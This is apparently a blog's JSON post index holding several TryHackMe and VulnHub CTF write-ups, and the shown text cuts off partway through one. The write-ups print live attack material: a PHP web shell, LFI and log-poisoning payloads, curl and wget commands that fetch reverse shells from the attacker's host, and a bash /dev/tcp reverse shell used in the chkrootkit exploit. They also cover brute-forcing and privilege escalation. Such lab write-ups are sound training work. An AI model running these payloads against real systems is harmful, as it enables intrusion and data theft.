[{"content":"Here\u0026rsquo;s my write-up for Bounty Hacker, a CTF challenge created by Sevuhl.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\n Port 21: vsftpd 3.0.3 Port 22: OpenSSH 7.2p2 Port 80: Apache httpd 2.4.18  I started with the FTP server on port 21 because nmap reported that anonymous login was allowed. There I found two files: \u0026ldquo;task.txt\u0026rdquo; and \u0026ldquo;locks.txt\u0026rdquo;.\nGiven that I had found a potential username and a list of (what looked like) passwords, I had a go at brute-forcing SSH.\nI logged in using the credentials and found the first flag.\nThe next thing to do was to elevate to the root user, to find the second flag. For this, I checked lin\u0026rsquo;s sudo permissions and could see that they could run \u0026ldquo;/bin/tar\u0026rdquo; as root.\nGTFOBins lists a way to get a shell if a user is permitted to run \u0026ldquo;/bin/tar\u0026rdquo; as the root user.\nUsing this method I gained access to the root account and found the second flag.\nFinal thoughts A fun little box, and one I\u0026rsquo;d recommend to any beginner. Thank you Sevuhl!\n","permalink":"/posts/tryhackme-bountyhacker/","summary":"Here\u0026rsquo;s my write-up for Bounty Hacker, a CTF challenge created by Sevuhl.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\n Port 21: vsftpd 3.0.3 Port 22: OpenSSH 7.2p2 Port 80: Apache httpd 2.4.18  I started with the FTP server on port 21 because nmap reported that anonymous login was allowed. There I found two files: \u0026ldquo;task.txt\u0026rdquo; and \u0026ldquo;locks.txt\u0026rdquo;.\nGiven that I had found a potential username and a list of (what looked like) passwords, I had a go at brute-forcing SSH.","title":"TryHackMe: Bounty Hacker"},{"content":"Here\u0026rsquo;s my write-up for Res, a CTF challenge created by stuxnet.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\nAn Apache webserver was accessible on port 80, and on port 6379, Redis. I checked out port 80 which just returned the default Apache webpage. I set up gobuster to scan the server but killed it after five minutes as it didn\u0026rsquo;t find anything, and I\u0026rsquo;m pretty sure this wasn\u0026rsquo;t the right track to be on. I also tried connecting to the redis instance using redis-cli, and found that it wasn\u0026rsquo;t password protected.\nI remembered that there was a way to write to files on the system using Redis. I wondered if it was possible to write something to /var/www/html which is where the web-hosted files would probably be. If it was possible, I might be able to execute some code by via a web request.\nI used redis-cli to write a basic phpinfo script and placed it under /var/www/html, and loaded it up in my browser. It worked! Now that I had proved my theory, I replayed the steps, only this time creating a file called shell.php which contained \u0026lt;?php system($_GET['cmd']) ?\u0026gt;.\nI could now run commands through my shell script, but what I needed was a reverse shell.\nI set up my machine to host a reverse shell file (named r_shell.php) and downloaded the reverse shell onto the other machine using the shell already on there:\nhttp://10.10.32.178/shell.php?cmd=wget+http://10.11.23.23:3000/r_shell.php I set up netcat and executed the reverse shell by visiting http://10.10.32.178/r_shell.php\nAfter some enumeration, I found another user called \u0026ldquo;vianka\u0026rdquo; and I found that xxd had the SUID bit set on it. GTFOBins came to the rescue, once again, documenting a way to read files with elevated privileges.\nUsing xxd I was able to read /etc/shadow and I cracked the user\u0026rsquo;s password with john.\nThe final flag I had to get was root\u0026rsquo;s flag. The \u0026ldquo;cheeky way\u0026rdquo; is to read the flag using xxd, assuming it is in the usual location /root/root.txt\nThe \u0026ldquo;correct\u0026rdquo; way is to log into vianka\u0026rsquo;s account using the cracked password and escalate the privileges. It turned out that vianka has full root permissions, so there wasn\u0026rsquo;t much to escalate!\nFinal thoughts A nice little challenge, suitable for anyone getting into CTFs. Thank you stuxnet!\n","permalink":"/posts/tryhackme-res/","summary":"Here\u0026rsquo;s my write-up for Res, a CTF challenge created by stuxnet.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\nAn Apache webserver was accessible on port 80, and on port 6379, Redis. I checked out port 80 which just returned the default Apache webpage. I set up gobuster to scan the server but killed it after five minutes as it didn\u0026rsquo;t find anything, and I\u0026rsquo;m pretty sure this wasn\u0026rsquo;t the right track to be on.","title":"TryHackMe: Res"},{"content":"Here\u0026rsquo;s my write-up for dogcat, a CTF challenge created by jammy.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\nTwo ports: SSH on port 22 and Apache on port 80. I took a look first at what was running on port 80.\nIt was a website that showed you pictures of cats and dogs. Awh how nice. The showing of dogs and cats was controlled by a query parameter in the URL:\n?view=dog ?view=cat I tried a few different words, such as bird, fish, etc. but I was returned an error message: \u0026ldquo;Sorry, only dogs or cats are allowed.\u0026rdquo;\nI started messing with this parameter and managed to break something fairly quickly:\n?view=dog\u0026quot;-- This error showed me two things: a file was being \u0026ldquo;included\u0026rdquo; in the script, and \u0026ldquo;.php\u0026rdquo; was being appended to the parameter value. I did some reading around LFI in PHP applications and managed to get a base64 encoded version of cat.php with the following query parameter:\n?view=php://filter/convert.base64-encode/resource=cat I did the same for \u0026ldquo;dog\u0026rdquo;, and I now had the source code for cat.php and dog.php:\n(base64) PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K \u0026lt;img src=\u0026quot;cats/\u0026lt;?php echo rand(1, 10); ?\u0026gt;.jpg\u0026quot; /\u0026gt; (base64) PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K \u0026lt;img src=\u0026quot;dogs/\u0026lt;?php echo rand(1, 10); ?\u0026gt;.jpg\u0026quot; /\u0026gt; I then tried \u0026ldquo;index\u0026rdquo; to see if I could get the contents of index.php but no luck, the filter was getting in the way. Something was checking that the view query parameter value had \u0026ldquo;cat\u0026rdquo; or \u0026ldquo;dog\u0026rdquo; in it. I messed around with this for quite a while, before coming up with a solution.\nI remembered that you could chain PHP wrappers:\nWhat would happen if I added \u0026ldquo;cat\u0026rdquo;? Would it just be ignored because it\u0026rsquo;s not a valid filter?\n?view=php://filter/convert.base64-encode|cat/resource=index It worked! I now had the source code for index.php\n\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;dogcat\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; type=\u0026quot;text/css\u0026quot; href=\u0026quot;/style.css\u0026quot;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;dogcat\u0026lt;/h1\u0026gt; \u0026lt;i\u0026gt;a gallery of various dogs or cats\u0026lt;/i\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;What would you like to see?\u0026lt;/h2\u0026gt; \u0026lt;a href=\u0026quot;/?view=dog\u0026quot;\u0026gt;\u0026lt;button id=\u0026quot;dog\u0026quot;\u0026gt;A dog\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026quot;/?view=cat\u0026quot;\u0026gt;\u0026lt;button id=\u0026quot;cat\u0026quot;\u0026gt;A cat\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; \u0026lt;?php function containsStr($str, $substr) { return strpos($str, $substr) !== false; } $ext = isset($_GET[\u0026quot;ext\u0026quot;]) ? $_GET[\u0026quot;ext\u0026quot;] : '.php'; if(isset($_GET['view'])) { if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) { echo 'Here you go!'; include $_GET['view'] . $ext; } else { echo 'Sorry, only dogs or cats are allowed.'; } } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; The source code of index.php exposed another parameter: \u0026ldquo;ext\u0026rdquo;. Sending this parameter through with the request but leaving it blank stopped the \u0026ldquo;.php\u0026rdquo; bit from being added. Now I had a way to look at any file I wanted, given the user had permissions of course.\nhttp://10.10.172.246/?view=php://filter/convert.base64-encode|cat/resource=/etc/passwd\u0026amp;ext= root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt❌100:65534::/nonexistent:/usr/sbin/nologin Now I had to go about getting a shell set up. I did a bit more research and came across a log poisoning technique, where you inject some malicious PHP code into the logs, then load the log file using the LFI exploit, thus executing your code. First I checked that I could access the log file.\nI could see all the requests I had made previously, so this looked like it was going to work. I loaded up netcat and sent a simple shell script to the server.\nI loaded up the log file using the LFI exploit, and I could see my commands being executed and displayed in the response.\nThe next thing to do was to try and get a reverse shell onto the box. I tried to run a few basic reverse shell commands, but they weren\u0026rsquo;t working. This box didn\u0026rsquo;t have a lot installed on it, but it did have curl.\nI hosted a reverse shell on my machine, on port 4000, and used my basic command shell to download it and save it as \u0026ldquo;shell.php\u0026rdquo; on the box. ?view=php://filter/convert.base64-encode|convert.base64-decode|cat/resource=/var/log/apache2/access.log\u0026amp;ext=\u0026amp;cmd=curl+http%3a//10.11.23.23%3a4000/shell.php+--output+shell.php I set up netcat, hit shell.php with Burp, and I had access.\nThe next thing to do was to escalate my access. This wasn\u0026rsquo;t too tricky. I ran sudo -l and could see that www-data could run /usr/bin/env as root without a password, which gave me access to a root shell.\nI looked around a bit, and saw some signs that I was in a container. ps -aux was returning limited results, and the root directory had a .dockerenv file.\nI looked around a little more and came across a backup file and backup script in the opt directory. This script looked like it was running from the host machine. The root user on the container had write privileges to this script, so I rewrote the script to be a reverse shell and set up a listener using netcat on my machine.\nAfter about a minute or two, whatever was running the backup script executed the script, and I had a shell on the host. This is where the final flag was located.\nFinal thoughts A super interesting challenge that required me to think of a funky way to get around LFI filtering. Thank you jammy!\n","permalink":"/posts/tryhackme-dogcat/","summary":"Here\u0026rsquo;s my write-up for dogcat, a CTF challenge created by jammy.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\nTwo ports: SSH on port 22 and Apache on port 80. I took a look first at what was running on port 80.\nIt was a website that showed you pictures of cats and dogs. Awh how nice. The showing of dogs and cats was controlled by a query parameter in the URL:","title":"TryHackMe: dogcat"},{"content":"Here\u0026rsquo;s my write-up for Cyborg, a CTF challenge created by fieldraccoon.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\n└─$ nmap -sC -sV 10.10.12.196 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-01 11:07 EDT Nmap scan report for 10.10.12.196 Host is up (0.025s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA) | 256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA) |_ 256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds Two ports: 80 and 22. I first took a look at what was running on port 80 in my browser.\nIt was just the default Apache page, so I set up gobuster to scan the website. It quickly found two interesting pages:\n/etc /admin Under /admin I found a basic website, some sort of personal website for someone called Alex.\nI found a chat log on the website where Alex had mentioned a proxy setup that they were having trouble with, but also a backup they had taken called \u0026ldquo;music_archive\u0026rdquo;.\nI clicked around the website some more and saw that I could download a tar archive. Was this the archive Alex had mentioned?\nUnder /etc something was serving documents.\nInside passwd I found the following content:\nmusic_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn. I guessed that this was the password for the archive I had just downloaded, although the password looked hashed. I took a look at a list of hashed password formats and found a match.\nI copied the hash into a text file and used john to crack the password with the rockyou wordlist.\nI now had some credentials:\nmusic_archive:squidward Back to the archive. I unpacked the archive and inside was a README that stated the archive had been made with something called Borg.\nI downloaded a copy of Borg and found a command to list archives. I used the password \u0026ldquo;squidward\u0026rdquo; and it worked!\nWith the password confirmed I could extract the contents. This looked like a copy of Alex\u0026rsquo;s home directory.\nA note in Alex\u0026rsquo;s documents gave me a second set of credentials.\nWith these credentials I SSH\u0026rsquo;d into Alex\u0026rsquo;s account and found the first flag.\nAfter finding user.txt I took a look at what sudo permissions Alex had. Alex\u0026rsquo;s user can run a backup script as root without a password. I took a look at the permissions of this script and noticed that Alex was the owner, but didn\u0026rsquo;t have write permissions. If I could change what the script was doing I could run it as root, essentially running what I wanted as root. I updated the permissions on backup.sh with chmod and then added a line to the end of backup.sh that would start a new interactive bash session.\nOnce I had everything in place I ran the script as root, giving me access to root.txt\nFinal thoughts I had a lot of fun with this box. It wasn\u0026rsquo;t too challenging and was a nice re-introduction into the world of CTF\u0026rsquo;s after a bit of time off. Thanks, fieldraccoon!\n","permalink":"/posts/tryhackme-cyborg/","summary":"Here\u0026rsquo;s my write-up for Cyborg, a CTF challenge created by fieldraccoon.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\n└─$ nmap -sC -sV 10.10.12.196 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-01 11:07 EDT Nmap scan report for 10.10.12.196 Host is up (0.025s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA) | 256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA) |_ 256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519) 80/tcp open http Apache httpd 2.","title":"TryHackMe: Cyborg"},{"content":"Here\u0026rsquo;s my write-up for Git Happens, a CTF challenge created by hydragyrum.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\n─$ nmap -sC -sV 10.10.184.212 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-31 14:30 EDT Nmap scan report for 10.10.184.212 Host is up (0.026s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http nginx 1.14.0 (Ubuntu) | http-git: | 10.10.184.212:80/.git/ | Git repository found! |_ Repository description: Unnamed repository; edit this file 'description' to name the... |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Super Awesome Site! Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.54 seconds I also checked all ports (using the -p- flag) but only port 80 was reported as open.\nI checked out the website in my browser and found a login screen. I messed around with it for a few moments but couldn\u0026rsquo;t make anything interesting happen.\nI checked the source code and noticed that there was some JS that was obfuscated.\nI tried to use a few online tools to un-obfuscate the code but I couldn\u0026rsquo;t make it any more readable. I left this thought for a moment and remembered that a .git directory was found by nmap.\nI downloaded a copy of GitTools so that I could download the .git directory onto my machine for further investigation.\nI checked the git log and could see a fair number of commits. Reading through the commits it was pretty clear that a developer had attempted a clean-up job after writing some initial code.\nI checked out commit 395e087 and took a look at index.html.\nThe password was found! This is as far as the box goes, so quite a quick one.\nFinal thoughts A fun quick challenge. I use Git every day so this was very familiar territory for me, but a great example of what can happen when you have secrets in your Git history, or when your .git directory is made public\u0026hellip; or both! Thanks, hydragyrum!\n","permalink":"/posts/tryhackme-githappens/","summary":"Here\u0026rsquo;s my write-up for Git Happens, a CTF challenge created by hydragyrum.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\n─$ nmap -sC -sV 10.10.184.212 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-31 14:30 EDT Nmap scan report for 10.10.184.212 Host is up (0.026s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http nginx 1.14.0 (Ubuntu) | http-git: | 10.10.184.212:80/.git/ | Git repository found!","title":"TryHackMe: Git Happens"},{"content":"Here\u0026rsquo;s my write-up for VulnNet Node, a CTF challenge created by TheCyb3rW0lf.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\nI also ran a full port scan but this was the only port open. Node.js running Express, hosting a webpage.\nI took a look at the website in my browser and found a fairly simple website with some sort of account functionality.\nI followed the link to the login page.\nI tried a few different inputs but couldn\u0026rsquo;t make anything interesting happen, so I took a look at the source code.\nThe form wasn\u0026rsquo;t wired up to anything. Weird. At this point, I had already starting capturing traffic with Burp so I went back to Burp and took another look at the requests and responses.\nI could see a cookie that was being sent from my browser to the application on requests. Burp decoded the cookie from base64 which showed it contained some JSON which (I presumed) was being parsed by the application in some way. I modified the contents of the cookie and could see my changes reflected in the response. I wondered if there was some sort of template injection so I tried a few different things to trigger an error, in hopes that an error might give me a bit more to work with.\nI set the cookie\u0026rsquo;s \u0026ldquo;username\u0026rdquo; value to \u0026ldquo;\\\u0026rdquo; and the following error was returned:\nThis error showed that the application was using a library called \u0026ldquo;node-serialize\u0026rdquo;. I began researching different exploits and vulnerabilities that might be present within the node-serialize library, and came across an interesting blog post. This blog post summarised an exploit present in node-serialize, and even provided a python script to generate a payload which would initiate a reverse shell. I downloaded the script, ran it, set up netcat to listen for the connection back, and sent the payload.\nI had successfully gained shell access to the machine. I took a look around and found another user on the box: \u0026ldquo;serv-manage\u0026rdquo;. I also ran sudo -l to see what the \u0026ldquo;www\u0026rdquo; user could do.\nGTFOBins documented a way to initiate a shell via NPM. If I could do this, I would get shell access as the \u0026ldquo;serv-manage\u0026rdquo; user.\nAfter a few attempts (and a fair bit of mistyping) I had a shell.\nI then took a look at what sudo privileges \u0026ldquo;serv-manage\u0026rdquo; had, and found that they had access to run three systemctl commands and edit a couple of files in /etc/systemd/system. If I could alter what these scripts were executing, I could potentially get a remote shell as the root user.\nI upgraded my shell because I knew I would need to use an editor to edit these files. For future me:\nOn the remote machine: python3 -c \u0026quot;import pty;pty.spawn('/bin/bash')\u0026quot;; export TERM=xterm ctrl + Z to background the session On my machine: stty raw -echo; fg vulnnnet-auto.timer ran vulnnet-job.service every 30 minutes. The first thing to do was to change vulnnnet-auto.timer to run every minute, just to speed things up a bit. The second thing to do was to change the command vulnnet-job.service was executing. I set up netcat to listen on a different port on my machine and had vulnnet-job.service initiate a remote connection back to my machine.\nI saved the files, ran the commands, waited a few seconds, and I had root!\nFinal thoughts A fun challenge that had me scratching my head a few times. Thanks, TheCyb3rW0lf!\n","permalink":"/posts/tryhackme-vulnnet-node/","summary":"Here\u0026rsquo;s my write-up for VulnNet Node, a CTF challenge created by TheCyb3rW0lf.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\nI also ran a full port scan but this was the only port open. Node.js running Express, hosting a webpage.\nI took a look at the website in my browser and found a fairly simple website with some sort of account functionality.\nI followed the link to the login page.","title":"TryHackMe: VulnNet Node"},{"content":"Here\u0026rsquo;s my write-up for Sunset: Decoy, a VulnHub box created by whitecr0wz, which is part of the Sunset series.\nWrite-up The description for this box states the following:\nEasy/Intermediate (May variate depending on your background) It is recommended to run this machine in Virtualbox. I ran nmap to see which services were exposed:\nkali@kali:~$ nmap -sC -sV -p- 192.168.1.123 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 04:11 EDT Nmap scan report for 60832e9f188106ec5bcc4eb7709ce592 (192.168.1.123) Host is up (0.00050s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA) | 256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA) |_ 256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519) 80/tcp open http Apache httpd 2.4.38 | http-ls: Volume / | SIZE TIME FILENAME | 3.0K 2020-07-07 16:36 save.zip |_ |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Index of / Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Only port 80 and 22 appeared to be exposed. I took a look at what was being served by port 80 and found a single zip file named \u0026ldquo;save.zip\u0026rdquo;. I downloaded the file and attempted to extract the contents but found that it required a password.\nI used fcrackzip to crack the zip password: \u0026ldquo;manuel\u0026rdquo;.\nInside the zip file was a backup from (I guessed) the box I was trying to gain access to. I could see the passwd file and the shadow file, which was all I needed to attempt to crack the user\u0026rsquo;s passwords.\nThe password for user \u0026ldquo;296640a3b825115a47b68fc44501c828\u0026rdquo; was \u0026ldquo;server\u0026rdquo;. I logged into the machine using ssh and started looking around. Looking around was a little difficult to do at this point because I was in a restricted shell, something I needed to break out of if I was going to get anywhere.\nI found an interesting looking executable named \u0026ldquo;honeypot.decoy\u0026rdquo;. I ran honeypot.decoy to see what it did, and I also copied honeypot.decoy back to my machine for some analysis in Ghidra.\nGhidra showed what each option honeypot.decoy was executing under the hood. The first interesting option was option 7 as I could potentially use vi to break out of the restricted shell. The second interesting option was option 5. The output of this option suggested that an AV scan was going to start in \u0026ldquo;a minute or less\u0026rdquo; but the command that was ran as part of this option just placed a file in /dev/shm named STTY5246. This suggested to me that there was a cronjob running every minute that looked for this particular file and would action something based on its presence.\nThe first thing to do was to break out of the restricted shell using vi. I ran honeypot.decoy, entered option 7 which placed me into a vi editor. I ran the following commands in vi to gain access to a sh session:\n:set shell=/bin/sh :shell Once I had an unrestricted shell I updated the PATH as the PATH was set to: /home/296640a3b825115a47b68fc44501c828 which was a bit limited.\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH Now I could do some interesting things:\nBefore I got started looking into option 5 in honeypot.decoy I looked around the user\u0026rsquo;s home directory a bit more and came across some log files for a program named \u0026ldquo;pspy\u0026rdquo;. I did some research and found out that pspy was a tool for showing processes running on the machine without the need for root permissions.\nI downloaded a copy of pspy for myself and copied it onto the machine using scp and ran it, hoping it would give me some more insight into what that presumed cronjob (option 5) is doing.\nIn one tab I selected option 5 from honeypot.decoy and in another tab I had pspy running on the box. Within 30 seconds I could see a flood of processes appearing from something called chkrootkit, executed by root.\nSure enough, the existence of \u0026ldquo;STTY5246\u0026rdquo; in /dev/shm was causing something, somewhere, to execute chkrootkit.\nI looked around for some more information on chkrootkit and came across an exploit for the exact version of chkrootkit the box was running:\n- Put an executable file named 'update' with non-root owner in /tmp (not mounted noexec, obviously) - Run chkrootkit (as uid 0) Result: The file /tmp/update will be executed as root, thus effectively rooting your box, if malicious content is placed inside the file. I placed a reverse shell command into /tmp/update and marked the file as executable, as per the exploit instructions:\n#!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.199/9000 0\u0026gt;\u0026amp;1 I also set up a listener on my machine using nc. A few seconds later the update was executed and I had remote root access:\nFinal thoughts This was a fun little box to root. I was left scratching my head a few times but I managed to get there in the end with a bit of research and \u0026ldquo;out of the box\u0026rdquo; thinking. Thanks Felipe!\n","permalink":"/posts/vulnhub-sunset-decoy/","summary":"Here\u0026rsquo;s my write-up for Sunset: Decoy, a VulnHub box created by whitecr0wz, which is part of the Sunset series.\nWrite-up The description for this box states the following:\nEasy/Intermediate (May variate depending on your background) It is recommended to run this machine in Virtualbox. I ran nmap to see which services were exposed:\nkali@kali:~$ nmap -sC -sV -p- 192.168.1.123 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 04:11 EDT Nmap scan report for 60832e9f188106ec5bcc4eb7709ce592 (192.","title":"VulnHub: Sunset Decoy"},{"content":"Here\u0026rsquo;s my write-up for Agent Sudo, a CTF challenge created by DesKel.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\nkali@kali:~$ nmap -sC -sV 10.10.108.158 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-02 15:15 EDT Nmap scan report for 10.10.108.158 Host is up (0.021s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Annoucement Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel I first tried to log in to the FTP server using an anonymous login but that didn\u0026rsquo;t work so I started looking for things on port 80. Viewing the root webpage in Firefox gave me some interesting information:\nI sent a request using Burp with the user-agent header set to \u0026ldquo;R\u0026rdquo; to see what would happen.\nUser-Agent: R This was the response:\nThe first line of the response body read the following:\nWhat are you doing! Are you one of the 25 employees? If not, I going to report this incident I presumed that the other 25 employees were other agents, all sharing a similar codename to Agent R. I used the Intruder feature in Burp to make 26 requests, all to the root page with a different User-Agent.\nSetting the user-agent to User-Agent: C resulted in a 302 response, which redirected me to agent_C_attention.php, which contained the following:\nNow that I had a username I decided to give brute-forcing the FTP server a shot using Hydra.\nhydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.180.158 ftp -V -f -I This proved successful and I now had some credentials for chris.\nI logged in to the FTP server as chris and found three files: To_agentJ.txt, cute-alien.jpg and cutie.png.\nReading the contents of To_agentJ.txt revealed that some sort of steganography work was going to be required:\nI used stegoveritas to scan cutie.png which revealed a hidden password-protected zip file:\nI used john to crack the zip file password, which turned out to be \u0026ldquo;alien\u0026rdquo;; probably something I should have guessed in retrospect.\nThe zip file contained the file To_agentR.txt, the contents being:\nThe value \u0026ldquo;QXJlYTUx\u0026rdquo; screamed \u0026ldquo;base64\u0026rdquo; at me, so I decoded it and found the value \u0026ldquo;Area51\u0026rdquo;.\nI moved on to cute-alien.jpg and found that it also contained a hidden message, however, this was password protected:\nI tried \u0026ldquo;Area51\u0026rdquo; and\u0026hellip; success!\nNow I had a set of credentials for james. I managed to log in using these credentials over SSH:\nI enumerated the box for a little while, trying a few different things. It turned out that there were some interesting sudo permissions set for james:\nI did a bit of research and found an exploit using searchsploit that I thought would be successful. The full exploit can be viewed on exploit-db here.\nThe last step was to run the exploit and hope for the best:\nFinal thoughts This was a fun little box that wasn\u0026rsquo;t too challenging and kept me interested the whole way through. Thanks, DesKel!\n","permalink":"/posts/tryhackme-agent-sudo/","summary":"Here\u0026rsquo;s my write-up for Agent Sudo, a CTF challenge created by DesKel.\nWrite-up I deployed the box using TryHackMe\u0026rsquo;s interface and scanned the host using nmap:\nkali@kali:~$ nmap -sC -sV 10.10.108.158 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-02 15:15 EDT Nmap scan report for 10.10.108.158 Host is up (0.021s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.","title":"TryHackMe: Agent Sudo"},{"content":"Here\u0026rsquo;s my write-up for Cloud AV, a VulnHub box created by BoredHackerBlog.\nWrite-up The description for this box states the following:\nCloud Anti-Virus Scanner! is a cloud-based antivirus scanning service. Currently, it's in beta mode. You've been asked to test the setup and find vulnerabilities and escalate privs. Difficulty: Easy Tasks involved: port scanning webapp attacks sql injection command injection brute forcing code analysis Virtual Machine: Format: Virtual Machine (Virtualbox OVA) Operating System: Linux Networking: DHCP Service: Enabled IP Address Automatically assign This works better with VirtualBox than VMware The listed tasks are exploits I have some familiarity with so I decided that this would be a good box to brush up some techniques.\nOnce I found out what IP the box was running on I scanned the ports using nmap:\nkali@kali:~/Documents/vulnhub/borderhackerblog/cloud_av$ nmap -sC -sV 192.168.1.245 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-05 05:06 EDT Nmap scan report for cloudav (192.168.1.245) Host is up (0.00042s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6a:42:4b:7c:2a:06:0f:50:4b:32:cf:b8:31:e9:c4:f4 (RSA) | 256 81:c7:60:0f:d7:1e:56:f7:a3:1e:9f:76:27:bd:31:27 (ECDSA) |_ 256 